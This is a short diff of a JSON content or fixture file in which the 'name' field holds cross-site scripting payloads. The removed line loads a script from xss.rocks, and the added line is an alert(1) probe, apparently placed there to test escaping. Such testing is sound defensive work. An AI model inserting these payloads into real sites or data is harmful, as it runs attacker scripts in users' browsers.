@@ -1,5 +1,5 @@
 {
-  "name" : "<SCRIPT SRC=https://xss.rocks/xss.js></SCRIPT>",
+  "name" : "<SCRIPT>alert(1)</SCRIPT>",
   "audio": "",
   "image": "../static/images/pages/home/sections/highlights/stereo/matterhorn.jpg",
   "isStereo": true,
